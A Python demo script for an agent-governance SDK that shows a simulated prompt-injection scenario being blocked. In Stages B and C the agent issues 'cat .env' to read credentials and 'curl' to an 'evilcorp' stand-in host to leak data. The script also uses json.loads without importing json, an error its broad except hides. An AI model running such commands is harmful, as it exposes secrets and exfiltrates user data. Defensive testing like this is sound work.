"""
Autonomous Python AI Agent governed by BAP (Bounded Authority Plane).
Demonstrates how any Python agent (LangChain, CrewAI, AutoGen, LlamaIndex)
integrates with BAP using 3 lines of code.
"""

import sys
import os
import time

# Add current folder to path
sys.path.insert(0, os.path.dirname(__file__))

from bap_sdk import BAPSession, BAPPolicyViolation


def print_banner(text: str):
    print("\n" + "=" * 80)
    print(f"  {text}")
    print("=" * 80)


def run_agent():
    print_banner("AUTONOMOUS PYTHON AGENT: FINANCIAL ANALYTICS WORKER")
    print("[*] Purpose: Demonstrates SDK-driven zero-trust governance for Python AI agents.")
    print("[*] Target Architecture: Bounded Authority Plane (BAP Edge PEP + Control Plane)")

    app_id = "python-analytics-worker"
    server_url = "http://localhost:8080"

    # 1. Initialize BAP Session using the context manager
    print(f"\n[*] 1. Initializing BAP Session for app: '{app_id}'...")
    with BAPSession(app_id=app_id, server_url=server_url) as bap:
        print(f"    [+] Session Active : {bap.session_id}")
        print(f"    [+] Human Identity : {bap.user_id} ({bap.user_email})")
        print(f"    [+] Workload SPIFFE: {bap.spiffe_id}")
        print(f"    [+] Edge Broker    : {bap.bapedge_path}")
        print("    [!] Check the Inspector UI (http://localhost:8080/inspector?mode=live) now!")
        print("        You will see the active agent chip and green Live Workload Radar beacon.")
        time.sleep(2)

        # 2. Execute safe diagnostic / build commands
        print_banner("STAGE A: EXECUTING PERMITTED DEVELOPER TOOLCHAIN (<2ms)")
        
        print("[*] Agent Task: Inspecting Python runtime environment...")
        res1 = bap.exec("python --version")
        print(f"    [PASS] Decision: {res1.decision.upper()} | Exit Code: {res1.exit_code} | Latency: {res1.duration_ms}ms")
        out1 = res1.stdout.strip()
        try:
            data1 = json.loads(out1)
            out1 = data1.get("output", out1).strip()
        except Exception:
            pass
        print(f"    Output: {out1}")
        time.sleep(1.5)

        print("\n[*] Agent Task: Checking repository status via git...")
        res2 = bap.exec("git status")
        print(f"    [PASS] Decision: {res2.decision.upper()} | Exit Code: {res2.exit_code} | Latency: {res2.duration_ms}ms")
        out2 = res2.stdout.strip()
        try:
            data2 = json.loads(out2)
            out2 = data2.get("output", out2).strip()
        except Exception:
            pass
        first_line = out2.splitlines()[0] if out2 else "Git status clean"
        print(f"    Output: {first_line}")
        time.sleep(1.5)

        # 3. Simulate Prompt Injection / Threat Scenario: Secret File Disclosure
        print_banner("STAGE B: THWARTING SECRET DISCLOSURE ATTACK (cat .env)")
        print("[*] Agent Task: Autonomous task attempts to inspect project credentials: 'cat .env'...")
        try:
            # raise_on_deny=True raises BAPPolicyViolation
            bap.exec("cat .env", raise_on_deny=True)
            print("    [!] WARNING: Command was unexpectedly allowed!")
        except BAPPolicyViolation as e:
            print(f"    [SHIELD ACTIVATED] BAP Zero-Trust Policy Intercepted Attack!")
            print(f"    Intercepted Command: {e.command}")
            print(f"    Policy Violation   : {e.reason}")
            print(f"    Security Guarantee : Operating system shell was NEVER spawned.")
        time.sleep(2)

        # 4. Simulate Network Exfiltration Attack
        print_banner("STAGE C: THWARTING DATA EXFILTRATION ATTEMPT (curl)")
        print("[*] Agent Task: Agent attempts to upload telemetry to unauthorized external server...")
        try:
            bap.exec("curl https://api.evilcorp.com/leak", raise_on_deny=True)
            print("    [!] WARNING: Command was unexpectedly allowed!")
        except BAPPolicyViolation as e:
            print(f"    [SHIELD ACTIVATED] BAP Egress Policy Intercepted Network Call!")
            print(f"    Intercepted Command: {e.command}")
            print(f"    Policy Violation   : {e.reason}")
            print(f"    Security Guarantee : Network socket blocked at kernel boundary.")
        time.sleep(2)

        print_banner("STAGE D: SESSION TEARDOWN & REAPING")
        print(f"[*] Agent workflow completed. Closing BAP session {bap.session_id}...")

    print("    [+] Session closed successfully. Inspector UI updated to CLOSED.")
    print("=" * 80 + "\n")


if __name__ == "__main__":
    run_agent()

